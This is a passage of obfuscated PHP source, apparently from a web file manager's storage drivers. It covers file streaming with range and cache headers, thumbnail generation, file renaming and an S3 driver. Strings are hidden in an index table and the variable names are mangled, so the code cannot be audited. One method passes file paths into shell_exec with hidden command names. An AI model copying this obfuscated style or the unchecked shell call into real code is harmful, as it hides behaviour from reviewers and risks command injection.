(!self::$md5Cache[$Î³¶õš]) { self::$md5Cache[$Î³¶õš] = @md5_file($Î³¶õš); } return self::$md5Cache[$Î³¶õš]; } private function hashMd5Shell($·¸˜çÕ³) { $™ë§ş‘ =& $_SERVER[‘ÆÜ‘œ]; if (!$·¸˜çÕ³) { return md5($™ë§ş‘[12]); } if (!function_exists($™ë§ş‘[99])) { return !1; } $šü¡ÛÎõ = array($™ë§ş‘[100], $™ë§ş‘[101]); $õË±ââÖ = Cache::get($™ë§ş‘[102]); if (!$õË±ââÖ) { $£àŸæ§£ = BASIC_PATH . $™ë§ş‘[103]; $ŠÔÊ¹¯ = md5_file($£àŸæ§£); $õË±ââÖ = $™ë§ş‘[104]; foreach ($šü¡ÛÎõ as $‘Ğ®ãâê) { $‚‰˜ú´ì = shell_exec($‘Ğ®ãâê . "\40\42{$£àŸæ§£}\x22"); if ($‚‰˜ú´ì && substr(trim($‚‰˜ú´ì), 0, 32) == $ŠÔÊ¹¯) { $õË±ââÖ = $‘Ğ®ãâê; break; } } Cache::set($™ë§ş‘[102], $õË±ââÖ, 3600); } if ($õË±ââÖ == $™ë§ş‘[104]) { return !1; } $‚‰˜ú´ì = shell_exec($õË±ââÖ . "\x20\x22{$·¸˜çÕ³}\x22"); $‚‰˜ú´ì = str_replace($™ë§ş‘[105], $™ë§ş‘[12], $‚‰˜ú´ì); return substr($‚‰˜ú´ì, 0, 32); } public function link($‘ŒÖÀÅ—) { return $‘ŒÖÀÅ—; } public function fileOut($§Ö·Á, $œ‰¿™Éñ = false, $Êüœò‘ = false, $ôÛò¸œ´ = '') { $Íø²¬øØ =& $_SERVER[‘ÆÜ‘œ]; $this->cacheMethod(null, null); if (!$§Ö·Á || !$this->exist($§Ö·Á)) { show_json(LNG($Íø²¬øØ[106]), !1, $Êüœò‘); } $«Ç†ª÷— = $this->getType() == $Íø²¬øØ[107]; $€”À¢¤ª = $GLOBALS[$Íø²¬øØ[6]][$Íø²¬øØ[92]][$Íø²¬øØ[108]][$Íø²¬øØ[109]]; $‚Í¼‰ğô = (double) $GLOBALS[$Íø²¬øØ[6]][$Íø²¬øØ[92]][$Íø²¬øØ[108]][$Íø²¬øØ[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¤èÀ§“„ = $this->infoFull($§Ö·Á); $ô¢ñêå = $¤èÀ§“„[$Íø²¬øØ[79]]; $éšùşéÃ = gmdate($Íø²¬øØ[111], $¤èÀ§“„[$Íø²¬øØ[88]]); $ì¨™ó´Ó = $Êüœò‘ ? $Êüœò‘ : $this->iconvApp($¤èÀ§“„[$Íø²¬øØ[32]]); $¼Íı†› = 0; $³úœ«„Ó = $ô¢ñêå - 1; $ƒÀªÕ˜÷ = $this->ext($ì¨™ó´Ó); if (in_array($ƒÀªÕ˜÷, array($Íø²¬øØ[112], $Íø²¬øØ[113], $Íø²¬øØ[114], $Íø²¬øØ[115]))) { $ƒÀªÕ˜÷ = $Íø²¬øØ[116]; } if (in_array($ƒÀªÕ˜÷, array($Íø²¬øØ[117]))) { $ƒÀªÕ˜÷ = $Íø²¬øØ[118]; } if (!$ôÛò¸œ´) { $ôÛò¸œ´ = md5($éšùşéÃ . $ô¢ñêå); } $ôÛò¸œ´ = $Íø²¬øØ[119] . $ôÛò¸œ´ . $Íø²¬øØ[119]; $³Š¥¨² = get_file_mime($ƒÀªÕ˜÷); $¨Â¾şÏ = !0; $¨Â¾şÏ = isset($_GET[$Íø²¬øØ[120]]) ? !1 : !0; if ($œ‰¿™Éñ === !1 && !mime_support($³Š¥¨²)) { $³Š¥¨² = $Íø²¬øØ[121]; } header($Íø²¬øØ[122]); header($Íø²¬øØ[123] . $³Š¥¨²); $–©Õ­®œ = rawurlencode($ì¨™ó´Ó); $–©Õ­®œ = $Íø²¬øØ[119] . $–©Õ­®œ . $Íø²¬øØ[124] . $–©Õ­®œ; if ($œ‰¿™Éñ) { header($Íø²¬øØ[125]); header($Íø²¬øØ[126] . $–©Õ­®œ); } else { if ($¨Â¾şÏ) { header($Íø²¬øØ[127] . $–©Õ­®œ); } } $ú†»©î = 3600 * 24 * 30; header($Íø²¬øØ[128]); header($Íø²¬øØ[129]); header($Íø²¬øØ[130] . $ú†»©î); header($Íø²¬øØ[131] . gmdate($Íø²¬øØ[111], time() + $ú†»©î) . $Íø²¬øØ[132]); if (isset($_SERVER[$Íø²¬øØ[133]]) && strtotime($_SERVER[$Íø²¬øØ[133]]) == $¤èÀ§“„[$Íø²¬øØ[88]]) { header($Íø²¬øØ[134], !0, 304); die; } if (isset($_SERVER[$Íø²¬øØ[135]]) && $_SERVER[$Íø²¬øØ[135]] == $ôÛò¸œ´) { header($Íø²¬øØ[136] . $ôÛò¸œ´, !0, 304); die; } header($Íø²¬øØ[136] . $ôÛò¸œ´); header($Íø²¬øØ[137] . $éšùşéÃ . $Íø²¬øØ[132]); header($Íø²¬øØ[138] . rawurlencode($ì¨™ó´Ó)); header($Íø²¬øØ[139]); header($Íø²¬øØ[140] . $ô¢ñêå); header($Íø²¬øØ[141]); Hook::trigger($Íø²¬øØ[142], $§Ö·Á, $ô¢ñêå, $ì¨™ó´Ó, $ƒÀªÕ˜÷); if (!$œ‰¿™Éñ && $ƒÀªÕ˜÷ == $Íø²¬øØ[143]) { if ($ô¢ñêå > 1024 * 1024 * 10) { die; } $„ÉÃï² = $this->getContent($§Ö·Á); $„ÉÃï² = Html::clearSVG($„ÉÃï²); header($Íø²¬øØ[144] . strlen($„ÉÃï²)); echo $„ÉÃï²; die; } $Ì¼ãÔãµ = strtolower($_SERVER[$Íø²¬øØ[145]]); if ($«Ç†ª÷— && $Ì¼ãÔãµ && $€”À¢¤ª) { if (strstr($Ì¼ãÔãµ, $Íø²¬øØ[146])) { header($Íø²¬øØ[147] . $§Ö·Á); } else { if (strstr($Ì¼ãÔãµ, $Íø²¬øØ[148])) { header($Íø²¬øØ[149] . $§Ö·Á); } else { if (strstr($Ì¼ãÔãµ, $Íø²¬øØ[150])) { header($Íø²¬øØ[151] . $§Ö·Á); } } } if ($‚Í¼‰ğô) { header($Íø²¬øØ[152] . $‚Í¼‰ğô); } return; } if (isset($_SERVER[$Íø²¬øØ[153]])) { if (preg_match($Íø²¬øØ[154], $_SERVER[$Íø²¬øØ[153]], $¹ĞÀï…Á)) { $¼Íı†› = intval($¹ĞÀï…Á[1]); $¼Íı†› = $¼Íı†› <= 0 ? 0 : ($¼Íı†› >= $³úœ«„Ó ? $³úœ«„Ó : $¼Íı†›); if (!empty($¹ĞÀï…Á[2])) { $¼İúÓÌ = intval($¹ĞÀï…Á[2]); $³úœ«„Ó = $¼İúÓÌ < $¼Íı†› ? $¼Íı†› : ($¼İúÓÌ >= $³úœ«„Ó ? $³úœ«„Ó : $¼İúÓÌ); } } header($Íø²¬øØ[155]); header("\103\x6f\156\x74\145\x6e\164\x2d\122\x61\156\147\x65\72\40\x62\171\164\x65\x73\x20{$¼Íı†›}\55{$³úœ«„Ó}\57" . $ô¢ñêå); } else { header($Íø²¬øØ[156]); } header($Íø²¬øØ[157]); header($Íø²¬øØ[158]); $ç……·¥Ö = !0; if ($_SERVER[$Íø²¬øØ[159]] == $Íø²¬øØ[160] && $ô¢ñêå > 1204 * 1024 * 1024 * 2) { $ç……·¥Ö = !1; } if ($ç……·¥Ö) { header($Íø²¬øØ[161] . ($³úœ«„Ó - $¼Íı†› + 1)); } if ($_SERVER[$Íø²¬øØ[162]] == $Íø²¬øØ[163]) { return; } $Àä±âŠ… = array($Íø²¬øØ[164] => !1, $Íø²¬øØ[165] => $¼Íı†›, $Íø²¬øØ[166] => $³úœ«„Ó, $Íø²¬øØ[167] => $ƒÀªÕ˜÷, $Íø²¬øØ[168] => $¤èÀ§“„, $Íø²¬øØ[169] => $Íø²¬øØ[12], $Íø²¬øØ[170] => 0); $Àä±âŠ… = Hook::filter($Íø²¬øØ[171], $Àä±âŠ…); $ªåÓàŸî = 1024 * 300; $é‚µ¨¨ = 0; if ($‚Í¼‰ğô) { $é‚µ¨¨ = intval(1000 * 1000 * ($ªåÓàŸî / $‚Í¼‰ğô)); } while ($¼Íı†› <= $³úœ«„Ó) { $ŞÃ±ò£² = timeFloat(); check_abort(); $û–Èõû‹ = $³úœ«„Ó - $¼Íı†› + 1; if ($û–Èõû‹ <= $ªåÓàŸî) { $ªåÓàŸî = $û–Èõû‹; } $„ÉÃï² = $this->fileSubstr($§Ö·Á, $¼Íı†›, $ªåÓàŸî); if ($Àä±âŠ…[$Íø²¬øØ[164]]) { $Àä±âŠ…[$Íø²¬øØ[169]] = $„ÉÃï²; $Àä±âŠ…[$Íø²¬øØ[170]] = $¼Íı†›; $Àä±âŠ… = Hook::filter($Íø²¬øØ[172], $Àä±âŠ…); $„ÉÃï² = $Àä±âŠ…[$Íø²¬øØ[169]]; } echo $„ÉÃï²; $¼Íı†› += $ªåÓàŸî; if ($ªåÓàŸî == $û–Èõû‹) { $¼Íı†› = $³úœ«„Ó + 1; } if ($é‚µ¨¨) { $ú‚¡Û¨ì = intval(1000 * 1000 * (timeFloat() - $ŞÃ±ò£²)); $®Ôƒü±¬ = $é‚µ¨¨ - $ú‚¡Û¨ì; if ($®Ôƒü±¬ > 5) { usleep($®Ôƒü±¬); } } } } public function fileOutServer($ÛÃØ†¸, $úñ‡·ŞÇ = false, $— Š„Ò = false, $¿¨½óµĞ = '') { $this->fileOut($ÛÃØ†¸, $úñ‡·ŞÇ, $— Š„Ò, $¿¨½óµĞ); } public function fileOutLink($»«¯Æ—») { header($_SERVER[‘ÆÜ‘œ][173] . $»«¯Æ—»); die; } public function cacheMethod($êŒšÃÊ×, $•Ú»œÖ, $ƒ¼ù™êß = null) { $ÅÏÖçÀö =& $_SERVER[‘ÆÜ‘œ]; static $Àİş¤© = array(); $÷—ÁÑúÉ = $•Ú»œÖ ? ltrim($this->getPathOuter($•Ú»œÖ), $ÅÏÖçÀö[8]) : $ÅÏÖçÀö[12]; $Ï¦¬ÀèÈ = $ÅÏÖçÀö[174] . $êŒšÃÊ× . $ÅÏÖçÀö[175] . rtrim($÷—ÁÑúÉ, $ÅÏÖçÀö[8]); if (is_null($êŒšÃÊ×)) { $Àİş¤© = array(); return; } if (is_null($•Ú»œÖ)) { foreach ($Àİş¤© as $Ï¦¬ÀèÈ => $ûØÜ¥) { if (!strstr($Ï¦¬ÀèÈ, $ÅÏÖçÀö[174] . $êŒšÃÊ× . $ÅÏÖçÀö[176])) { continue; } unset($Àİş¤©[$Ï¦¬ÀèÈ]); } return; } if ($ƒ¼ù™êß === $ÅÏÖçÀö[177]) { unset($Àİş¤©[$Ï¦¬ÀèÈ]); return; } if (!is_null($ƒ¼ù™êß)) { $Àİş¤©[$Ï¦¬ÀèÈ] = $ƒ¼ù™êß; return; } $›æšÚË‚ = isset($Àİş¤©[$Ï¦¬ÀèÈ]) ? $Àİş¤©[$Ï¦¬ÀèÈ] : null; if (!is_null($›æšÚË‚)) { return $›æšÚË‚; } $›æšÚË‚ = $this->{$êŒšÃÊ×}($•Ú»œÖ); $Àİş¤©[$Ï¦¬ÀèÈ] = $›æšÚË‚; return $›æšÚË‚; } public function cacheMethodInfoSet($úàİøï–, $Ùªƒ³»ğ, $æ×Ä•ûÕ = false) { $À‹ÊàÛ€ =& $_SERVER[‘ÆÜ‘œ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($À‹ÊàÛ€[178], $úàİøï–, $Ùªƒ³»ğ); $this->cacheMethod($À‹ÊàÛ€[179], $úàİøï–, $Ùªƒ³»ğ ? !1 : !0); if (is_array($æ×Ä•ûÕ)) { $this->cacheMethod($À‹ÊàÛ€[180], $úàİøï–, $æ×Ä•ûÕ); } } public function fileOutImage($‹åˆ†İÁ, $œÌ†–°Œ = 250) { $æü«¦– =& $_SERVER[‘ÆÜ‘œ]; set_timeout(); if (substr($‹åˆ†İÁ, 0, 4) == $æü«¦–[150]) { $this->fileOutLink($‹åˆ†İÁ); } $Ü¥†°« = $this->info($‹åˆ†İÁ); $÷‚ôÂ¦ = !1; $æ·™€êÛ = isset($GLOBALS[$æü«¦–[181]]) ? $GLOBALS[$æü«¦–[181]] : array(); if ($æ·™€êÛ && $æ·™€êÛ[$æü«¦–[182]] == $Ü¥†°«[$æü«¦–[87]]) { $Ü¥†°« = $æ·™€êÛ; $½æâÍ°‘ = $Ü¥†°«[$æü«¦–[183]]; if ($½æâÍ°‘ && isset($½æâÍ°‘[$æü«¦–[184]])) { if ($½æâÍ°‘[$æü«¦–[184]] <= $œÌ†–°Œ && $½æâÍ°‘[$æü«¦–[185]] <= $œÌ†–°Œ) { $÷‚ôÂ¦ = !0; } } } if ($Ü¥†°«[$æü«¦–[79]] <= 1024 * 50 || $÷‚ôÂ¦ || !function_exists($æü«¦–[186]) || $Ü¥†°«[$æü«¦–[167]] == $æü«¦–[187]) { return $this->fileOut($‹åˆ†İÁ, !1, $Ü¥†°«[$æü«¦–[32]]); } $ŞıÁğæı = kodIO::hashPath($Ü¥†°«); $÷×¿‡šß = "\x63\x6f\166\x65\162\x5f{$ŞıÁğæı}\x5f{$œÌ†–°Œ}\56\160\x6e\147"; $Êòçä¡¡ = IO_PATH_SYSTEM_TEMP . $æü«¦–[188]; $‹ª‚í = IO::infoFullSimple($Êòçä¡¡); $íÜÛ²¨Ô = $‹ª‚í && is_array($‹ª‚í) ? $‹ª‚í[$æü«¦–[87]] : $æü«¦–[12]; if (!$íÜÛ²¨Ô) { $íÜÛ²¨Ô = IO::mkdir($Êòçä¡¡); } if ($Ü¥†°«[$æü«¦–[189]] == $æü«¦–[190] && isset($Ü¥†°«[$æü«¦–[191]]) && $Ü¥†°«[$æü«¦–[191]] == kodIO::sourceID($íÜÛ²¨Ô)) { $„¾¸ƒ¤ä = $Ü¥†°«[$æü«¦–[192]]; if ($œÌ†–°Œ <= 500) { $©‚éì´Œ = preg_replace($æü«¦–[193], $æü«¦–[194], $Ü¥†°«[$æü«¦–[32]]); $„¾¸ƒ¤ä = IO::fileNameExist($íÜÛ²¨Ô, $©‚éì´Œ); } return IO::fileOut(KodIO::make($„¾¸ƒ¤ä), !1, $Ü¥†°«[$æü«¦–[32]]); } $ß‹ŒåéÍ = IO::fileNameExist($íÜÛ²¨Ô, $÷×¿‡šß); if ($ß‹ŒåéÍ) { return IO::fileOut(KodIO::make($ß‹ŒåéÍ), !1, $Ü¥†°«[$æü«¦–[32]]); } if ($œÌ†–°Œ > 1000) { $this->makeImageCover($íÜÛ²¨Ô, $‹åˆ†İÁ, $÷×¿‡šß, $œÌ†–°Œ); $this->makeImageCover($íÜÛ²¨Ô, $‹åˆ†İÁ, "\143\157\x76\145\162\x5f{$ŞıÁğæı}\137\x32\x35\60\56\160\x6e\147", 250); $ß‹ŒåéÍ = IO::fileNameExist($íÜÛ²¨Ô, $÷×¿‡šß); if ($ß‹ŒåéÍ) { return IO::fileOut(KodIO::make($ß‹ŒåéÍ), !1, $Ü¥†°«[$æü«¦–[32]]); } die; } if (!kodIO::allowCover($Ü¥†°«)) { return $this->fileOut($‹åˆ†İÁ, !1, $Ü¥†°«[$æü«¦–[32]]); } $Àâ‹ƒÚç = Cache::get($÷×¿‡šß); if ($Àâ‹ƒÚç == $æü«¦–[195] || $Àâ‹ƒÚç == $æü«¦–[196]) { echo $Àâ‹ƒÚç; die; } Cache::set($÷×¿‡šß, $æü«¦–[196], 60); $Ò²û²â× = array($íÜÛ²¨Ô, $Ü¥†°«[$æü«¦–[87]], $÷×¿‡šß, $œÌ†–°Œ); $Õ®Ã¡Ä = $æü«¦–[197] . $Ü¥†°«[$æü«¦–[79]] . $æü«¦–[198] . $÷×¿‡šß . $æü«¦–[199] . $Ü¥†°«[$æü«¦–[32]] . $æü«¦–[200] . $Ü¥†°«[$æü«¦–[87]]; TaskQueue::add($æü«¦–[201], $Ò²û²â×, $Õ®Ã¡Ä, $÷×¿‡šß); } public function makeImageCover($–ßö˜˜», $¹ëÀ·¨ô, $£ñä¿Ë, $¹’ë‡´Ê) { $©¤¾Ò¥ =& $_SERVER[‘ÆÜ‘œ]; if (IO::fileNameExist($–ßö˜˜», $£ñä¿Ë)) { return $©¤¾Ò¥[202]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ü·ĞŠ–¤ = $this->getPathOuter($¹ëÀ·¨ô); $È¥»êÌ‹ = DATA_THUMB . $£ñä¿Ë; del_file($È¥»êÌ‹); $‘¥´Á = IO::copy($ü·ĞŠ–¤, TEMP_FILES, !1, $£ñä¿Ë); if (!@file_exists($‘¥´Á)) { return $©¤¾Ò¥[203]; } ImageThumb::createThumb($‘¥´Á, $È¥»êÌ‹, $¹’ë‡´Ê, $¹’ë‡´Ê * 10); if (@file_exists($È¥»êÌ‹)) { Cache::remove($£ñä¿Ë); return IO::move($È¥»êÌ‹, $–ßö˜˜»); } Cache::set($£ñä¿Ë, $©¤¾Ò¥[195], 600); del_file($È¥»êÌ‹); return $©¤¾Ò¥[204] . $‘¥´Á . $©¤¾Ò¥[74]; } public function fileOutImageServer($úÖôøó, $“Îèä—ƒ = 250) { $this->fileOutImage($úÖôøó, $“Îèä—ƒ); } public function fileNameAuto($ÕûÏ¯‰, $²Ÿ‹, $ÓÓ¡¢Ï° = REPEAT_RENAME, $îĞ«Û¸ = false) { $¸µ¹íŞÉ =& $_SERVER[‘ÆÜ‘œ]; $«£†ÑÅ = $ÕûÏ¯‰ === $¸µ¹íŞÉ[12] ? $²Ÿ‹ : rtrim($ÕûÏ¯‰, $¸µ¹íŞÉ[8]) . $¸µ¹íŞÉ[8] . $²Ÿ‹; if ($ÓÓ¡¢Ï° == REPEAT_REPLACE || !$this->exist($«£†ÑÅ) || $îĞ«Û¸ && $ÓÓ¡¢Ï° != REPEAT_RENAME_FOLDER) { return $²Ÿ‹; } if ($ÓÓ¡¢Ï° == REPEAT_SKIP) { return !1; } $®Š¥˜î§ = $¸µ¹íŞÉ[10] . get_path_ext($²Ÿ‹); $®Š¥˜î§ = $®Š¥˜î§ == $¸µ¹íŞÉ[10] || $îĞ«Û¸ ? $¸µ¹íŞÉ[12] : $®Š¥˜î§; $æÎ„ó¶™ = 1; $Ÿä‡»ßì = substr($²Ÿ‹, 0, strlen($²Ÿ‹) - strlen($®Š¥˜î§)); $ß»Ññæë = $Ÿä‡»ßì . "\x28{$æÎ„ó¶™}\51{$®Š¥˜î§}"; while ($this->exist(rtrim($ÕûÏ¯‰, $¸µ¹íŞÉ[8]) . $¸µ¹íŞÉ[8] . $ß»Ññæë)) { $ß»Ññæë = $Ÿä‡»ßì . "\x28{$æÎ„ó¶™}\51{$®Š¥˜î§}"; $æÎ„ó¶™++; } return $ß»Ññæë; } private function fileNameAutoList($µµÉÙëò, $×ÆËœşÉ, $«ñ¹Ãó = false) { $ˆÊÆÂ­ğ =& $_SERVER[‘ÆÜ‘œ]; $Æˆùé¥ = $this->listPath($µµÉÙëò, !0); $Æˆùé¥ = array_merge($Æˆùé¥[$ˆÊÆÂ­ğ[85]], $Æˆùé¥[$ˆÊÆÂ­ğ[86]]); $×ÂÜ’ô½ = array_to_keyvalue($Æˆùé¥, $ˆÊÆÂ­ğ[12], $ˆÊÆÂ­ğ[32]); $Öƒ¤şÏ¤ = $ˆÊÆÂ­ğ[10] . get_path_ext($×ÆËœşÉ); $Öƒ¤şÏ¤ = $Öƒ¤şÏ¤ == $ˆÊÆÂ­ğ[10] || $«ñ¹Ãó ? $ˆÊÆÂ­ğ[12] : $Öƒ¤şÏ¤; $ô¹âíèÊ = substr($×ÆËœşÉ, 0, strlen($×ÆËœşÉ) - strlen($Öƒ¤şÏ¤)); $š¼ûÀ¦İ = $ô¹âíèÊ . "\50\60\x29{$Öƒ¤şÏ¤}"; for ($»“ÌÙ¨Û = 1; $»“ÌÙ¨Û <= count($×ÂÜ’ô½) + 1; $»“ÌÙ¨Û++) { $š¼ûÀ¦İ = $ô¹âíèÊ . "\50{$»“ÌÙ¨Û}\51{$Öƒ¤şÏ¤}"; if (!in_array_not_case($š¼ûÀ¦İ, $×ÂÜ’ô½)) { return $š¼ûÀ¦İ; } } return $š¼ûÀ¦İ; } public function listAllFiles($õçÖæø, $¿à•­­ì) { $£ˆ×îñì =& $_SERVER[‘ÆÜ‘œ]; if (empty($¿à•­­ì)) { return array(); } $ÍÏ–Èúö = array_keys($¿à•­­ì); $·ïº¢¾Î = array(); $õçÖæø = trim($õçÖæø, $£ˆ×îñì[8]); foreach ($¿à•­­ì as $—ì³© ¦ => $‚±º–Œ) { $°Ú÷½Ô² = ltrim(substr(trim($—ì³© ¦, $£ˆ×îñì[8]), strlen($õçÖæø)), $£ˆ×îñì[8]); if (substr($—ì³© ¦, -1) == $£ˆ×îñì[8]) { $°Ú÷½Ô² = rtrim($°Ú÷½Ô², $£ˆ×îñì[8]) . $£ˆ×îñì[8]; } $·ïº¢¾Î = array_merge($·ïº¢¾Î, $this->slicePath($°Ú÷½Ô²)); } $Òóõó¼ø = array(); foreach (array_unique($·ïº¢¾Î) as $…èûÑúó) { $ÜÃŞ÷š = array($£ˆ×îñì[87] => $this->getPathOuter($£ˆ×îñì[8] . $õçÖæø . $£ˆ×îñì[8] . $…èûÑúó), $£ˆ×îñì[78] => 1, $£ˆ×îñì[79] => 0); if (substr($…èûÑúó, -1) != $£ˆ×îñì[8]) { $ÜÃŞ÷š[$£ˆ×îñì[78]] = 0; $ºí×°ö = $this->getPath($õçÖæø . $£ˆ×îñì[8] . $…èûÑúó); if (isset($¿à•­­ì[$ºí×°ö])) { $¨Ûşåäª = $¿à•­­ì[$ºí×°ö]; if (isset($¨Ûşåäª[$£ˆ×îñì[79]])) { $ÜÃŞ÷š[$£ˆ×îñì[79]] = intval($¨Ûşåäª[$£ˆ×îñì[79]]); } if (isset($¨Ûşåäª[$£ˆ×îñì[205]])) { $ÜÃŞ÷š[$£ˆ×îñì[88]] = intval($¨Ûşåäª[$£ˆ×îñì[205]]); } } } $Òóõó¼ø[] = $ÜÃŞ÷š; } return $Òóõó¼ø; } public function slicePath($›ã™í„) { $’úãŞ¼î =& $_SERVER[‘ÆÜ‘œ]; $Í¨ÊÕ²‘ = explode($’úãŞ¼î[8], trim($›ã™í„, $’úãŞ¼î[8])); $îÔ½ı‘— = 0; do { ++$îÔ½ı‘—; $æÒ »å[] = implode($’úãŞ¼î[8], array_slice($Í¨ÊÕ²‘, 0, $îÔ½ı‘—)) . $’úãŞ¼î[8]; } while ($îÔ½ı‘— < count($Í¨ÊÕ²‘)); $æÒ »å[count($Í¨ÊÕ²‘) - 1] = $›ã™í„; return $æÒ »å; } public function getHost() { $÷‹àšê =& $_SERVER[‘ÆÜ‘œ]; $½©Ê§ñù = parse_url(trim($this->domain, $÷‹àšê[8])); $§ıë°Ö¨ = isset($½©Ê§ñù[$÷‹àšê[206]]) ? $½©Ê§ñù[$÷‹àšê[206]] : http_type(); $æÅ ’¡ = isset($½©Ê§ñù[$÷‹àšê[207]]) ? $½©Ê§ñù[$÷‹àšê[207]] : $½©Ê§ñù[$÷‹àšê[87]]; if (isset($½©Ê§ñù[$÷‹àšê[208]])) { $æÅ ’¡ .= $÷‹àšê[4] . $½©Ê§ñù[$÷‹àšê[208]]; } return $§ıë°Ö¨ . $÷‹àšê[209] . $æÅ ’¡; } public function pathEncode($¾ûäÍ) { $Ú«À¶©ò =& $_SERVER[‘ÆÜ‘œ]; return str_replace($Ú«À¶©ò[210], $Ú«À¶©ò[8], rawurlencode($¾ûäÍ)); } public function writeLog($ıÏüŒıµ = '', $© äŠÛ† = false) { $Œ‘şÈ»÷ =& $_SERVER[‘ÆÜ‘œ]; $¤âãˆõ° = in_array(ACTION, array($Œ‘şÈ»÷[211], $Œ‘şÈ»÷[212])); if (!$¤âãˆõ° && !GLOBAL_DEBUG) { return; } $¡È˜®·ø = $ıÏüŒıµ; static $À×ó÷½ = null; if (!$À×ó÷½) { $À×ó÷½ = strtoupper($this->getType()); } $ıÏüŒıµ = $À×ó÷½ . $Œ‘şÈ»÷[213] . $ıÏüŒıµ; if ($© äŠÛ†) { $Ê«“¨ñ× = error_get_last(); if ($Ê«“¨ñ×) { $ıÏüŒıµ = array($ıÏüŒıµ, $Ê«“¨ñ×); } } write_log($ıÏüŒıµ, $Œ‘şÈ»÷[214]); if ($¤âãˆõ°) { throw new Exception($¡È˜®·ø); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($‰û¹‚´ß) { set_timeout(); require_once SDK_DIR . $_SERVER[‘ÆÜ‘œ][215]; parent::__construct(); $this->_init($‰û¹‚´ß); } public function _init($à „ô™æ) { $äı¡Ÿœ€ =& $_SERVER[‘ÆÜ‘œ]; $this->config = $à „ô™æ; foreach ($à „ô™æ as $™ëÕ‡å• => $•‡è„¥) { if (isset($this->{$™ëÕ‡å•})) { $this->{$™ëÕ‡å•} = $•‡è„¥; } } $this->endpoint = $à „ô™æ[$äı¡Ÿœ€[216]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $µ¯ŠØŞÄ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($µ¯ŠØŞÄ, 0, 7) == $äı¡Ÿœ€[217]) { $µ¯ŠØŞÄ = $äı¡Ÿœ€[218] . substr($µ¯ŠØŞÄ, 7); } $this->client->setEndpoint($µ¯ŠØŞÄ); if (in_array(ACTION, array($äı¡Ÿœ€[211], $äı¡Ÿœ€[212]))) { $this->client->setExceptions(); } } public function setSignVersion($±‘ÍÕ´ = "\166\64") { $this->signVer = $±‘ÍÕ´; $this->client->setSignVersion($±‘ÍÕ´); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $Ü³ÏÓç˜) { return null; } } public function isBucketCors() { $±İ°áô =& $_SERVER[‘ÆÜ‘œ]; $ ÷•¾ëÏ = $this->getBucketCors(); if (!$ ÷•¾ëÏ || !is_array($ ÷•¾ëÏ)) { return !1; } if (!is_array($ ÷•¾ëÏ[$±İ°áô[219]])) { $ ÷•¾ëÏ[$±İ°áô[219]] = explode($±İ°áô[50], $ ÷•¾ëÏ[$±İ°áô[219]]); } if ($ ÷•¾ëÏ[$±İ°áô[220]] != $±İ°áô[221] || !in_array($±İ°áô[221], $ ÷•¾ëÏ[$±İ°áô[219]])) { return !1; } $¯Š¾¹ = array_map($±İ°áô[222], $ ÷•¾ëÏ[$±İ°áô[223]]); if (!is_array($¯Š¾¹)) { $¯Š¾¹ = array(); } $µº¤÷Í— = array($±İ°áô[224], $±İ°áô[225], $±İ°áô[226], $±İ°áô[227], $±İ°áô[228]); $–‡†ÉĞ– = array_diff($µº¤÷Í—, $¯Š¾¹); return empty($–‡†ÉĞ–); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($óªŠ­È¾) { return $this->client->setRegion($óªŠ­È¾); } public function mkfile($Æ¯Š­¥ú, $¾¤ûù¯„ = '', $Á©ø„´‹ = REPEAT_RENAME) { $†ÓÌé¥ = $this->setContent($Æ¯Š­¥ú, $¾¤ûù¯„); if ($†ÓÌé¥ !== !1) { return $this->getPathOuter($Æ¯Š­¥ú); } return !1; } public function mkdir($ØåÈ££, $ª¬Ì¶Ö• = REPEAT_SKIP) { $¹ªèº£® =& $_SERVER[‘ÆÜ‘œ]; if (empty($ØåÈ££) && $ØåÈ££ !== $¹ªèº£®[229]) { return !1; } if ($ª¬Ì¶Ö• && $this->_isFolder($ØåÈ££)) { return $this->getPathOuter($ØåÈ££); } $«ÕÀúÊ¡ = $this->setContent($ØåÈ££, $¹ªèº£®[12], !0); if ($«ÕÀúÊ¡ !== !1) { return $this->getPathOuter($ØåÈ££); } return !1; } public function copyFile($Óò°¬ğ½, $Ûİ®†Ô¡, $Îıƒ™Ö£ = array()) { $Í´ï•õ =& $_SERVER[‘ÆÜ‘œ]; $‚æîÈû´ = $this->objectMeta($Óò°¬ğ½); if (!$‚æîÈû´) { return !1; } if ($‚æîÈû´[$Í´ï•õ[79]] <= 1024 * 1024 * 200) { $®Èè‹Øğ = $this->client->copyObject($this->bucket, $Óò°¬ğ½, $this->bucket, $Ûİ®†Ô¡, $Í´ï•õ[230], $Îıƒ™Ö£); } else { $®Èè‹Øğ = $this->client->multiCopyObject($this->bucket, $Óò°¬ğ½, $this->bucket, $Ûİ®†Ô¡, $Îıƒ™Ö£); } $®Èè‹Øğ = $®Èè‹Øğ ? $this->getPathOuter($Ûİ®†Ô¡) : !1; return $®Èè‹Øğ; } public function moveFile($Ñàè§®, $ú¤ÍÆßğ) { if ($this->copyFile($Ñàè§®, $ú¤ÍÆßğ)) { $this->delFile($Ñàè§®); return $this->getPathOuter($ú¤ÍÆßğ); } return !1; } public function delFile($İ–åõ“) { return $this->client->deleteObject($this->bucket, $İ–åõ“); } public function delFolder($›¯‹ÖÏ») { $¶ïáÕ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->exist($›¯‹ÖÏ»)) { return !0; } $this->listItemCache = !1; $ª¨ø×ö = $this->fileList($›¯‹ÖÏ»); $this->listItemCache = !0; $ó÷ÏùÅÓ = trim($›¯‹ÖÏ», $¶ïáÕ[8]) . $¶ïáÕ[8]; if (!empty($›¯‹ÖÏ») && $›¯‹ÖÏ» !== $¶ïáÕ[229] && !in_array($ó÷ÏùÅÓ, $ª¨ø×ö[$¶ïáÕ[85]])) { $ª¨ø×ö[$¶ïáÕ[85]][] = 